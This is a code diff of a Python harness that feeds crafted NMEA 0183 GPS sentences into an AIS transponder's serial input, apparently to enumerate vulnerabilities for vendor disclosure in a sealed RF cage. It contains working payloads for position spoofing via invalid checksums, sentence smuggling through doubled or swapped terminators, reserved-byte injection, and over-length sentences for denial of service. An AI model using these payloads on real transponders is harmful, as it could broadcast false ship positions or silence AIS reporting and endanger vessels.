@@ -1,294 +1,225 @@
 #!/usr/bin/env python3
 r"""
-serial_cve_suite.py -- systematic serial-interface (NMEA 0183 / IEC 61162-1) abuse suite for
-AIS transponders, built to ENUMERATE CVE-CANDIDATE weaknesses for vendor disclosure.
+serial_cve_suite.py -- CVE-enumeration harness for the AIS serial (NMEA 0183 / IEC 61162-1)
+interface. Focused (not the full conformance suite): it drives the strong CVE candidates and
+parser-differential hypotheses, and it is built on the CORRECT measurement model borrowed from
+the conformance harness:
 
-It feeds crafted GPS/position sentences to the transponder's serial sensor input and logs a
-timestamped manifest. A separate serial recorder (the unit's AIS output) and an SDR (VHF
-witness) capture what the unit does; analyze_serial_cve.py correlates all three into a
-per-finding CVE report.
+  * A CONTINUOUS VALID BASELINE (fixed 42.35/-70.90, reported with SOG=12 so the unit reports
+    fast) flows the whole time.
+  * Each probe is a SINGLE injection against that running-good state (NOT a flood). So:
+      - the unit REJECTS it -> its output stays on the baseline position           (good)
+      - the unit ACCEPTS it -> its output shows the fixed SPOOF position 43.5/-71.5 (violation)
+      - the unit DEGRADES   -> it drops to no-fix (91/181) / stops                  (robustness)
+    Because good GPS keeps flowing, a rejection can no longer be confused with a denial.
+  * Over-length probes are TIMED. Writing an N-char sentence at the baud rate takes
+    predicted_s = N*10/baud seconds, during which the sensor bus is monopolized and the unit is
+    starved -> the DoS suppression is ~predicted_s, and it SCALES with N (the headline claim).
+  * After each probe the baseline is held for gap >= reacquisition (and >= predicted_s for the
+    big over-length probes) so no-fix never bleeds into the next probe.
 
-KEY IDEA: every crafted sentence carries a DISTINCT spoof position, far from the valid
-baseline. During each test the valid feed is replaced by the crafted variant for a dwell
-window, then restored. The analyzer then decides, per test:
-  ACCEPTED  -> the unit's broadcast position moved to the spoof position (it acted on the
-               malformed input) -- the core evidence for false-position CVEs.
-  REJECTED  -> the unit held the baseline / went stale (it rejected the input) -- good.
-  DENIAL    -> the unit's own transmissions stopped for a measurable outage (DoS).
-  EMITTED   -> the unit re-emitted an over-length / malformed sentence on its output.
-  DIFFERENTIAL -> the unit broadcast a position a strict reference parser would NOT derive
-               from the sent bytes (field-shift, checksum-boundary, smuggled sentence).
+Smuggling / field-shift probes carry a SECOND distinct position (44.5/-72.5 or a field-shift
+target) so the analyzer can tell a smuggled/second-sentence parse from a normal one.
 
-Findings map to "Security Assessment of AIS Serial Conformance Findings": overlength ingest
-(DoS), invalid checksum (false position), reserved bytes, doubled/swapped terminators, talker
-digits, excess fields, and the plausibility violations (speed/movement/teleport/accel).
+analyze_serial_cve.py correlates the manifest with the unit's serial output AND the VHF witness,
+so each finding is judged on BOTH interfaces (did the spoof reach the air; did RF reporting stop).
 
-** SAFETY ** the unit will TRANSMIT its (spoofed) position over VHF -> cage sealed only.
-
-Setup (cage sealed):
-  transponder Pi: python3 record_serial.py --port <ais-out> --baud 38400   # unit AIS output
-  listener Pi:    ./record_ais.sh                                          # VHF witness
-  attacker Pi:    python3 serial_cve_suite.py --gps-port /dev/ttyUSB0 \
-                      --lat 42.35 --lon -70.90 --i-confirm-cage-sealed
-
-Requires: pyserial (only for live runs; --dry-run needs nothing).
+** SAFETY ** the unit transmits its (spoofed) position over VHF -> cage sealed only.
+Requires pyserial for a live run; --dry-run needs nothing.
 """
-import argparse, json, os, sys, time, threading
-
+import argparse, json, os, sys, time
 try:
     import serial
 except Exception:
     serial = None
 
-
-# ----------------------------------------------------------------------------
-# NMEA 0183 sentence construction
-# ----------------------------------------------------------------------------
-def checksum(body):
-    """XOR of every char between '$'/'!' and '*' (exclusive), as 2 hex digits."""
-    cs = 0
-    for c in body:
-        cs ^= ord(c)
-    return f"{cs:02X}"
+BASE = (42.3500, -70.9000)          # continuous valid baseline
+SPOOF = (43.5000, -71.5000)         # fixed spoof every position-bearing probe carries
+SMUGGLE = (44.5000, -72.5000)       # a smuggled 2nd sentence carries this
+SPOOF_LAT_F, SPOOF_LON_F = "4330.0000", "07130.0000"   # 43.5N / 71.5W as NMEA fields
 
 
-def _nm(deg, is_lat):
-    hemi = ('N' if deg >= 0 else 'S') if is_lat else ('E' if deg >= 0 else 'W')
-    deg = abs(deg); d = int(deg); m = (deg - d) * 60
-    return (f"{d:02d}{m:07.4f}" if is_lat else f"{d:03d}{m:07.4f}"), hemi
+# ---------------- NMEA builders (checksum per IEC 61162-1 7.2.4) ----------------
+def cksum(body):
+    c = 0
+    for ch in body:
+        c ^= ord(ch)
+    return f"{c:02X}"
 
 
-def gga_body(lat, lon, talker="GP"):
-    """The body of a GPGGA sentence (between $ and *), carrying position `lat,lon`."""
-    la, lah = _nm(lat, True); lo, loh = _nm(lon, False)
-    t = time.strftime("%H%M%S", time.gmtime())
-    # time, lat, N/S, lon, E/W, fix=1, sats=08, hdop=0.9, alt, M, geoid, M, dgps age, ref
-    return f"{talker}GGA,{t}.00,{la},{lah},{lo},{loh},1,08,0.9,10.0,M,0.0,M,,"
+def cksum_bytes(b):
+    c = 0
+    for x in b:
+        c ^= x
+    return f"{c:02X}"
 
 
-def rmc_body(lat, lon, sog=0.0, cog=0.0, talker="GP"):
-    la, lah = _nm(lat, True); lo, loh = _nm(lon, False)
-    t = time.strftime("%H%M%S", time.gmtime()); d = time.strftime("%d%m%y", time.gmtime())
-    return f"{talker}RMC,{t}.00,A,{la},{lah},{lo},{loh},{sog:.1f},{cog:.1f},{d},,,A"
-
-
-def sentence(body, term="\r\n", cksum=None):
-    """Wrap a body into a full sentence. cksum=None computes it; pass a string to force a
-    (possibly wrong) checksum; pass '' for a missing checksum."""
-    cs = checksum(body) if cksum is None else cksum
-    star = "*" if cksum != "" else ""
+def sent(body, term="\r\n", ck=None, star="*"):
+    cs = cksum(body) if ck is None else ck
     return f"${body}{star}{cs}{term}"
 
 
-def valid_feed(lat, lon, sog=0.0, cog=0.0):
-    """The clean baseline position feed (list of full sentences)."""
-    return [sentence(gga_body(lat, lon)),
-            sentence(rmc_body(lat, lon, sog, cog))]
+def _latf(deg):
+    h = 'N' if deg >= 0 else 'S'; deg = abs(deg); d = int(deg); m = (deg - d) * 60
+    return f"{d:02d}{m:07.4f}", h
 
 
-# ----------------------------------------------------------------------------
-# Test catalog. Each test is a dict:
-#   name, finding, cve (assessment strength), desc,
-#   spoof=(lat,lon) it tries to inject,
-#   gen(base, spoof, t) -> list[str] full byte strings to write this cycle,
-#   plus optional analyzer hints: shift=(lat,lon) a field-shift would yield,
-#   smuggle=(lat,lon) a smuggled 2nd sentence carries, dynamic=True for plausibility motion.
-# The catalog is intentionally easy to extend: add a row, give it a distinct spoof position.
-# ----------------------------------------------------------------------------
-def build_tests(base_lat, base_lon, overlength_lengths=(200, 1000, 4000, 16000)):
-    T = []
-    # distinct spoof position per test: base + a unique offset so the analyzer can attribute
-    def spoof(i): return (base_lat + 0.05 + 0.01 * i, base_lon + 0.05 + 0.01 * i)
-
-    # ---- 1. OVERLENGTH INGEST -> DoS (strong CVE) : valid GGA padded well past 82 chars.
-    #    A length SWEEP so the analyzer can characterize outage duration vs. input length on
-    #    BOTH the serial output and the RF (VHF) transmission. ----
-    for L in overlength_lengths:
-        sp = spoof(len(T))
-        def gen(base, sp, t, L=L):
-            b = gga_body(*sp)
-            pad = ",0" * ((L - len(b)) // 2 + 1)     # extra comma-fields to overrun 82
-            return [sentence(b + pad)]
-        T.append(dict(name=f"overlength_{L}", finding="1 overlength ingest", cve="STRONG",
-                      desc=f"valid GGA padded to ~{L} chars (mandatory 82-char bound)",
-                      spoof=sp, gen=gen))
-    # unterminated overlength: keep the parser waiting (no CR/LF)
-    sp = spoof(len(T))
-    def gen_unterm(base, sp, t):
-        b = gga_body(*sp); pad = ",0" * 2000
-        return [sentence(b + pad, term="")]          # NO terminator
-    T.append(dict(name="overlength_unterminated", finding="1 overlength ingest", cve="STRONG",
-                  desc="~4k-char GGA with NO terminator (parser starvation)",
-                  spoof=sp, gen=gen_unterm))
-
-    # ---- 6. INVALID CHECKSUM ACCEPTED -> false position (strong CVE) ----
-    for tag, ck in (("wrong", "00"), ("nonhex", "ZZ"), ("missing", ""), ("overlong", "ABCD")):
-        sp = spoof(len(T))
-        def gen(base, sp, t, ck=ck):
-            return [sentence(gga_body(*sp), cksum=ck)]
-        T.append(dict(name=f"badcksum_{tag}", finding="6 invalid checksum", cve="STRONG",
-                      desc=f"GGA carrying spoof position with a {tag} checksum",
-                      spoof=sp, gen=gen))
-
-    # ---- 3. RESERVED BYTE in a data field (parser weakness / smuggling) ----
-    for tag, ch in (("bang", "!"), ("dollar", "$"), ("star", "*"), ("caret", "^"), ("nul", "\x00")):
-        sp = spoof(len(T))
-        def gen(base, sp, t, ch=ch):
-            b = gga_body(*sp)
-            # inject the reserved char into the altitude field (near the middle)
-            b2 = b.replace("10.0", "1" + ch + "0.0", 1)
-            return [sentence(b2)]
-        T.append(dict(name=f"reserved_{tag}", finding="3 reserved byte", cve="MODERATE",
-                      desc=f"GGA with reserved char {repr(ch)} embedded in a data field",
-                      spoof=sp, gen=gen))
-
-    # ---- 4. DOUBLED TERMINATOR + smuggled 2nd sentence (sentence smuggling) ----
-    sp = spoof(len(T)); sm = (base_lat - 0.07, base_lon - 0.07)
-    def gen_dblterm(base, sp, t, sm=sm):
-        first = sentence(gga_body(*sp), term="\r\n\r\n")     # doubled terminator
-        second = sentence(gga_body(*sm))                     # smuggled, different position
-        return [first + second]
-    T.append(dict(name="doubled_terminator_smuggle", finding="4 doubled terminator",
-                  cve="MODERATE", desc="GGA with CRLFCRLF then a smuggled 2nd GGA (diff posn)",
-                  spoof=sp, smuggle=sm, gen=gen_dblterm))
-
-    # ---- 5. LF/CR ORDER SWAPPED + smuggled 2nd sentence ----
-    sp = spoof(len(T)); sm = (base_lat - 0.08, base_lon - 0.08)
-    def gen_lfcr(base, sp, t, sm=sm):
-        first = sentence(gga_body(*sp), term="\n\r")         # LF then CR (swapped)
-        second = sentence(gga_body(*sm))
-        return [first + second]
-    T.append(dict(name="lfcr_swap_smuggle", finding="5 swapped LF/CR", cve="WEAK",
-                  desc="GGA terminated LF/CR then a smuggled 2nd GGA (diff posn)",
-                  spoof=sp, smuggle=sm, gen=gen_lfcr))
-
-    # ---- 7. DIGITS IN TALKER FIELD (source-validation) ----
-    sp = spoof(len(T))
-    def gen_talker(base, sp, t):
-        return [sentence(gga_body(*sp, talker="G1"))]        # digit in talker id
-    T.append(dict(name="talker_digits", finding="7 talker digits", cve="WEAK",
-                  desc="GGA with a digit in the talker identifier ($G1GGA)",
-                  spoof=sp, gen=gen_talker))
-
-    # ---- 8. TOO MANY DATA FIELDS (+ field-shift differential) ----
-    sp = spoof(len(T)); shift = (base_lat + 0.30, base_lon + 0.30)
-    def gen_fields(base, sp, t, shift=shift):
-        # prepend TWO extra fields before the real ones -> a lenient parser may read shifted
-        # fields as lat/lon (the `shift` position); a strict one rejects.
-        b = gga_body(*sp)
-        b2 = b.replace("GGA,", "GGA,EXTRA1,EXTRA2,", 1)
-        return [sentence(b2)]
-    T.append(dict(name="too_many_fields", finding="8 excess fields", cve="MODERATE",
-                  desc="GGA with two extra leading fields (field-shift / parser differential)",
-                  spoof=sp, shift=shift, gen=gen_fields))
-
-    # ---- 9-12. PLAUSIBILITY: well-formed but physically impossible (semantic weakness) ----
-    sp = spoof(len(T))
-    def gen_spd_nomove(base, sp, t):
-        return [sentence(rmc_body(sp[0], sp[1], sog=45.0, cog=90.0))]   # fixed posn, fast SOG
-    T.append(dict(name="speed_without_movement", finding="9 speed w/o movement", cve="SEMANTIC",
-                  desc="RMC: fixed position, SOG=45kn", spoof=sp, gen=gen_spd_nomove))
-
-    sp = spoof(len(T))
-    def gen_move_nospd(base, sp, t):
-        lat = sp[0] + 0.0008 * t                             # advances each second
-        return [sentence(rmc_body(lat, sp[1], sog=0.0, cog=0.0))]
-    T.append(dict(name="movement_without_speed", finding="10 movement w/o speed", cve="SEMANTIC",
-                  desc="RMC: advancing position, SOG=0", spoof=sp, gen=gen_move_nospd, dynamic=True))
-
-    sp = spoof(len(T))
-    def gen_teleport(base, sp, t):
-        lat, lon = (sp if int(t) % 2 == 0 else (sp[0] + 3.0, sp[1] + 3.0))  # jump ~330km
-        return [sentence(rmc_body(lat, lon, sog=5.0, cog=90.0))]
-    T.append(dict(name="teleport", finding="11 teleportation", cve="SEMANTIC",
-                  desc="RMC: position jumps ~330 km between updates", spoof=sp,
-                  gen=gen_teleport, dynamic=True))
-
-    sp = spoof(len(T))
-    def gen_accel(base, sp, t):
-        lat = sp[0] + 0.02 * (t ** 2) * 0.001                # position ~ t^2 (accelerating)
-        return [sentence(rmc_body(lat, sp[1], sog=1.0, cog=0.0))]
-    T.append(dict(name="impossible_acceleration", finding="12 impossible accel", cve="SEMANTIC",
-                  desc="RMC: position ~ t^2 while SOG reported low", spoof=sp,
-                  gen=gen_accel, dynamic=True))
-
-    return T
+def _lonf(deg):
+    h = 'E' if deg >= 0 else 'W'; deg = abs(deg); d = int(deg); m = (deg - d) * 60
+    return f"{d:03d}{m:07.4f}", h
 
 
-# ----------------------------------------------------------------------------
-# Feeder: writes the current test's bytes to the serial port at `rate`
-# ----------------------------------------------------------------------------
-class Feeder(threading.Thread):
-    def __init__(self, ser, base_lat, base_lon, rate=1.0):
-        super().__init__(daemon=True)
-        self.ser, self.rate = ser, rate
-        self.base = (base_lat, base_lon)
-        self.gen = None            # current test gen; None => baseline
-        self.spoof = None
-        self.t0 = time.time()
-        self._stop = threading.Event()
+def gga(lat, lon):
+    ts = time.strftime("%H%M%S.00", time.gmtime()); la, lah = _latf(lat); lo, loh = _lonf(lon)
+    return sent(f"GPGGA,{ts},{la},{lah},{lo},{loh},1,08,0.9,10.0,M,0.0,M,,")
 
-    def set_test(self, test):
-        self.gen = test["gen"] if test else None
-        self.spoof = test["spoof"] if test else None
-        self.t0 = time.time()
 
-    def run(self):
-        while not self._stop.is_set():
-            if self.gen is None:
-                data = valid_feed(*self.base)
-            else:
-                data = self.gen(self.base, self.spoof, time.time() - self.t0)
-            for s in data:
-                self._write(s)
-            time.sleep(self.rate)
+def rmc(lat, lon, sog=0.0, cog=90.0):
+    ts = time.strftime("%H%M%S.00", time.gmtime()); ds = time.strftime("%d%m%y", time.gmtime())
+    la, lah = _latf(lat); lo, loh = _lonf(lon)
+    return sent(f"GPRMC,{ts},A,{la},{lah},{lo},{loh},{sog:.1f},{cog:.1f},{ds},,,A")
 
-    def _write(self, s):
-        if self.ser is None:
+
+def baseline_batch():
+    """Fixed baseline position, SOG=12 so the unit reports at the fast (2s) rate."""
+    return [gga(*BASE), rmc(*BASE, sog=12.0, cog=90.0)]
+
+
+# spoof-position bodies the probes mutate (structurally valid unless the probe breaks it)
+SPOOF_RMC_BODY = f"GPRMC,120000.00,A,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0.0,90.0,180626,,,A"
+# the baseline-position body, whose (valid) checksum is reused by the retain-original probe
+BASE_RMC_BODY = "GPRMC,120000.00,A,4221.0000,N,07054.0000,W,0.0,90.0,180626,,,A"
+
+
+def ok_body_bytes(body_bytes, start=b"$"):
+    """start + body + *cc + CRLF with a VALID checksum over body_bytes, so the only anomaly
+    is the feature under test (used for reserved/control-char probes)."""
+    return start + body_bytes + b"*" + cksum_bytes(body_bytes).encode() + b"\r\n"
+
+
+def overlen_rmc(total_chars):
+    """A spoof-position GPRMC padded with a trailing numeric field to exactly total_chars
+    (counting $ and *cc, excluding CRLF)."""
+    head = f"GPRMC,120000.00,A,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0.0,90.0,180626,,,A"
+    fixed = 1 + len(head) + 3
+    pad = total_chars - fixed
+    if pad > 0:
+        head = head + "," + "9" * (pad - 1)
+    return (sent(head)).encode()
+
+
+# ---------------- probe catalog (CVE-focused) ----------------
+# Each: id, finding, cve, gen()->bytes, and optional smuggle/shift targets + overlen length.
+def build_probes(overlen_lengths):
+    P = []
+
+    def add(id, finding, cve, gen, smuggle=None, shift=None, overlen=None):
+        P.append(dict(id=id, finding=finding, cve=cve, gen=gen,
+                      smuggle=smuggle, shift=shift, overlen=overlen))
+
+    # 1) OVERLENGTH -> DoS sweep (predicted_s = N*10/baud; suppression scales with N)
+    for n in overlen_lengths:
+        add(f"overlen_{n}", "1 overlength/DoS", "STRONG", (lambda n=n: overlen_rmc(n)), overlen=n)
+    add("overlen_unterminated", "1 overlength/DoS", "STRONG",
+        lambda: sent(f"GPRMC,120000.00,A,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0.0,90.0,180626"
+                     + ",9" * 2000, term="").encode(), overlen=4000)
+
+    # 6) INVALID CHECKSUM -> false position. Crude AND the plausible-but-wrong forms a unit may
+    #    actually accept (lowercase / over-wrong-range / commas-excluded) -- the ones the crude
+    #    "00"/"ZZ" tests miss.
+    add("cks_wrong00", "6 invalid checksum", "STRONG", lambda: ("$" + SPOOF_RMC_BODY + "*00\r\n").encode())
+    add("cks_nonhex", "6 invalid checksum", "STRONG", lambda: ("$" + SPOOF_RMC_BODY + "*ZZ\r\n").encode())
+    add("cks_missing", "6 invalid checksum", "STRONG", lambda: ("$" + SPOOF_RMC_BODY + "\r\n").encode())
+    add("cks_lowercase", "6 invalid checksum", "STRONG",
+        lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum(SPOOF_RMC_BODY).lower() + "\r\n").encode())
+    add("cks_wrong_range", "6 invalid checksum", "STRONG",
+        lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum("$" + SPOOF_RMC_BODY) + "\r\n").encode())
+    add("cks_retain_original", "6 invalid checksum", "STRONG",
+        lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum(BASE_RMC_BODY) + "\r\n").encode())
+    add("cks_one_digit", "6 invalid checksum", "STRONG",
+        lambda: ("$" + SPOOF_RMC_BODY + "*" + cksum(SPOOF_RMC_BODY)[0] + "\r\n").encode())
+
+    # 3) RESERVED / CONTROL bytes in a data field (checksum kept VALID -> only anomaly is the byte)
+    for tag, ch in (("dollar", b"$"), ("bang", b"!"), ("star", b"*"), ("caret", b"^"),
+                    ("tilde", b"\x7e"), ("del", b"\x7f"), ("nul", b"\x00"), ("cr", b"\r")):
+        body = b"GPRMC,120000.00,A," + SPOOF_LAT_F.encode() + b"," + ch + b"N,07130.0000,W,0.0,90.0,180626,,,A"
+        add(f"reserved_{tag}", "3 reserved byte", "MODERATE", (lambda body=body: ok_body_bytes(body)))
+
+    # 4/5) TERMINATOR SMUGGLING: first sentence spoof, smuggled 2nd sentence at SMUGGLE posn
+    def smuggle_gen(term):
+        first = sent(SPOOF_RMC_BODY, term=term)
+        sm_body = f"GPRMC,120000.00,A,4430.0000,N,07230.0000,W,0.0,90.0,180626,,,A"   # 44.5/-72.5
+        return (first + sent(sm_body)).encode()
+    add("doubled_terminator", "4 doubled terminator", "MODERATE",
+        lambda: smuggle_gen("\r\n\r\n"), smuggle=SMUGGLE)
+    add("lfcr_swap", "5 swapped LF/CR", "WEAK", lambda: smuggle_gen("\n\r"), smuggle=SMUGGLE)
+
+    # 8) TOO MANY FIELDS / field-shift: two extra leading fields; a lenient parser may read the
+    #    shifted fields as lat/lon. The shift target is what reading fields +2 over yields here:
+    #    with EXTRA1,EXTRA2 prepended, a shift makes the time field look like lat -> non-numeric,
+    #    so we flag any non-baseline/non-spoof position as a differential.
+    add("too_many_fields", "8 excess fields", "MODERATE",
+        lambda: ("$GPRMC,EXTRA1,EXTRA2,120000.00,A," + SPOOF_LAT_F + ",N," + SPOOF_LON_F
+                 + ",W,0.0,90.0,180626,,,A*" + cksum("GPRMC,EXTRA1,EXTRA2,120000.00,A,"
+                 + SPOOF_LAT_F + ",N," + SPOOF_LON_F + ",W,0.0,90.0,180626,,,A") + "\r\n").encode(),
+        shift="ANY")
+
+    # 7) ADDRESS field: digits / lowercase / special in talker
+    add("talker_digits", "7 talker digits", "WEAK",
+        lambda: sent("G1RMC,120000.00,A," + SPOOF_LAT_F + ",N," + SPOOF_LON_F
+                     + ",W,0.0,90.0,180626,,,A").encode())
+    add("talker_lower", "7 talker digits", "WEAK",
+        lambda: ("$gprmc,120000.00,A," + SPOOF_LAT_F + ",N," + SPOOF_LON_F
+                 + ",W,0.0,90.0,180626,,,a*00\r\n").encode())
+
+    # 9-12) SEMANTIC / plausibility (spec absent): structurally valid, impossible content at spoof
+    add("speed_no_movement", "9 speed w/o movement", "SEMANTIC",
+        lambda: sent(f"GPRMC,120000.00,A,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,60.0,90.0,180626,,,A").encode())
+    add("status_void", "9 status void", "SEMANTIC",
+        lambda: sent(f"GPRMC,120000.00,V,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0.0,90.0,180626,,,A").encode())
+    add("fix_invalid", "9 fix invalid", "SEMANTIC",
+        lambda: sent(f"GPGGA,120000.00,{SPOOF_LAT_F},N,{SPOOF_LON_F},W,0,04,2.0,10.0,M,,M,,").encode())
+    return P
+
+
+# ---------------- runner ----------------
+def hold_baseline(ser, seconds, rate=1.0):
+    end = time.time() + seconds
+    while time.time() < end:
+        for s in baseline_batch():
+            if ser is not None:
+                try: ser.write(s.encode())
+                except Exception: pass
+        if ser is None:
             return
-        try:
-            self.ser.write(s.encode("latin-1", "replace"))
-        except Exception:
-            pass
-
-    def stop(self):
-        self._stop.set()
+        time.sleep(rate)
 
 
-# ----------------------------------------------------------------------------
 def main():
-    ap = argparse.ArgumentParser(description="Serial NMEA CVE-enumeration suite.")
-    ap.add_argument("--gps-port", help="serial port feeding the unit's GPS input")
-    ap.add_argument("--gps-baud", type=int, default=4800)
-    ap.add_argument("--lat", type=float, default=42.35, help="baseline latitude")
-    ap.add_argument("--lon", type=float, default=-70.90, help="baseline longitude")
-    ap.add_argument("--dwell", type=float, default=30.0, help="seconds to feed each test")
-    ap.add_argument("--gap", type=float, default=45.0,
-                    help="baseline seconds between tests (also the recovery-observation window; "
-                         "keep >= a possible reboot time so recovery is measurable)")
-    ap.add_argument("--overlength-lengths", type=int, nargs="+",
-                    default=[200, 1000, 4000, 16000],
-                    help="sentence lengths for the overlength DoS sweep")
-    ap.add_argument("--settle", type=float, default=45.0, help="baseline before starting")
-    ap.add_argument("--only", nargs="+", help="run only these test names")
+    ap = argparse.ArgumentParser(description="Serial CVE-enumeration suite (continuous-baseline model).")
+    ap.add_argument("--gps-port"); ap.add_argument("--gps-baud", type=int, default=4800)
+    ap.add_argument("--gap", type=float, default=50.0, help="baseline recovery seconds after each probe (>= reacquisition)")
+    ap.add_argument("--reacq", type=float, default=30.0, help="extra recovery to add on top of an over-length write time")
+    ap.add_argument("--settle", type=float, default=90.0, help="initial baseline settle")
+    ap.add_argument("--overlen-lengths", type=int, nargs="+",
+                    default=[90, 200, 500, 1000, 2048, 4096, 8192, 16384])
+    ap.add_argument("--only", nargs="+")
     ap.add_argument("--logdir", default=os.path.expanduser("~/ais_tx"))
-    ap.add_argument("--dry-run", action="store_true",
-                    help="print each crafted sentence and exit (no serial, no hardware)")
+    ap.add_argument("--dry-run", action="store_true")
     ap.add_argument("--i-confirm-cage-sealed", action="store_true")
     args = ap.parse_args()
 
-    tests = build_tests(args.lat, args.lon, tuple(args.overlength_lengths))
+    probes = build_probes(tuple(args.overlen_lengths))
     if args.only:
-        tests = [t for t in tests if t["name"] in args.only]
+        probes = [p for p in probes if p["id"] in args.only]
 
     if args.dry_run:
-        for t in tests:
-            s = t["gen"]((args.lat, args.lon), t["spoof"], 0.0)
-            raw = "".join(s)
-            shown = raw.replace("\r", "\\r").replace("\n", "\\n").replace("\x00", "\\x00")
-            print(f"[{t['cve']:8}] {t['name']:28} len={len(raw):>5}  spoof={t['spoof'][0]:.4f},{t['spoof'][1]:.4f}")
-            print(f"           {shown[:140]}")
-        print(f"\n{len(tests)} tests. (dry-run: nothing transmitted)")
+        for p in probes:
+            raw = p["gen"](); n = len(raw)
+            pred = n * 10.0 / args.gps_baud if p["overlen"] else 0.0
+            shown = raw.decode("latin-1").replace("\r", "\\r").replace("\n", "\\n").replace("\x00", "\\0")
+            print(f"[{p['cve']:8}] {p['id']:22} len={n:>5} pred_dos={pred:5.1f}s  {shown[:96]}")
+        print(f"\n{len(probes)} probes. baseline={BASE} spoof={SPOOF} smuggle={SMUGGLE} (dry-run)")
         return
 
     if serial is None:
@@ -301,45 +232,34 @@ def main():
     stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
     manifest = os.path.join(args.logdir, f"serialcve_{stamp}.jsonl")
     mf = open(manifest, "a", buffering=1)
-    def rec(**kw):
-        mf.write(json.dumps({"t": time.time(),
-                             "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-                             **kw}) + "\n")
+    def rec(**kw): mf.write(json.dumps({"t": time.time(),
+                    "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), **kw}) + "\n")
 
     ser = serial.Serial(args.gps_port, args.gps_baud, timeout=1)
-    feeder = Feeder(ser, args.lat, args.lon)
-    feeder.start()
-    rec(event="session_start", base_lat=args.lat, base_lon=args.lon, n_tests=len(tests))
-    print(f"baseline @ {args.lat},{args.lon}; settling {args.settle}s ...")
-    time.sleep(args.settle)
-    rec(event="baseline", name="baseline_settle")   # analyzer baseline window
-    time.sleep(2)
+    rec(event="session_start", base_lat=BASE[0], base_lon=BASE[1],
+        spoof_lat=SPOOF[0], spoof_lon=SPOOF[1], gps_baud=args.gps_baud, n=len(probes))
+    print(f"baseline @ {BASE}, spoof {SPOOF}; settling {args.settle}s ...")
+    hold_baseline(ser, args.settle)
+    rec(event="baseline", name="baseline_settle"); hold_baseline(ser, 3)
 
     try:
-        for i, t in enumerate(tests):
-            sp = t["spoof"]
-            sample = "".join(t["gen"]((args.lat, args.lon), sp, 0.0))
-            rec(event="test_begin", name=t["name"], finding=t["finding"], cve=t["cve"],
-                desc=t["desc"], spoof_lat=sp[0], spoof_lon=sp[1],
-                shift_lat=t.get("shift", (None, None))[0],
-                shift_lon=t.get("shift", (None, None))[1],
-                smuggle_lat=t.get("smuggle", (None, None))[0],
-                smuggle_lon=t.get("smuggle", (None, None))[1],
-                sent_len=len(sample), sample=sample[:160].replace("\x00", "\\x00"))
-            print(f"[{i+1}/{len(tests)}] {t['name']} ({t['cve']}) spoof={sp[0]:.4f},{sp[1]:.4f}")
-            feeder.set_test(t)
-            time.sleep(args.dwell)
-            feeder.set_test(None)                    # restore baseline
-            rec(event="test_end", name=t["name"])
-            time.sleep(args.gap)
+        for i, p in enumerate(probes):
+            raw = p["gen"](); pred = len(raw) * 10.0 / args.gps_baud if p["overlen"] else 0.0
+            sm = p["smuggle"] or (None, None)
+            rec(event="probe_start", id=p["id"], finding=p["finding"], cve=p["cve"],
+                spoof_lat=SPOOF[0], spoof_lon=SPOOF[1],
+                smuggle_lat=sm[0], smuggle_lon=sm[1], shift=p["shift"],
+                predicted_s=round(pred, 3), sent_len=len(raw),
+                sample=raw[:120].decode("latin-1").replace("\x00", "\\0"))
+            print(f"[{i+1}/{len(probes)}] {p['id']} ({p['cve']}) pred_dos={pred:.1f}s")
+            t0 = time.time(); ser.write(raw); ser.flush(); write_s = time.time() - t0
+            rec(event="probe_end", id=p["id"], write_s=round(write_s, 3))
+            hold_baseline(ser, max(args.gap, pred + args.reacq))   # recovery >= reacquisition and write time
     except KeyboardInterrupt:
         print("\ninterrupted."); rec(event="interrupted")
     finally:
-        feeder.set_test(None); time.sleep(2)
-        feeder.stop(); ser.close(); rec(event="session_end"); mf.close()
-
-    print(f"\ndone. manifest: {manifest}")
-    print("Feed this + the unit's serial-output capture + the VHF capture to analyze_serial_cve.py")
+        hold_baseline(ser, 3); ser.close(); rec(event="session_end"); mf.close()
+    print(f"\ndone. manifest: {manifest}\nfeed it + the unit's serial output + the VHF capture to analyze_serial_cve.py")
 
 
 if __name__ == "__main__":
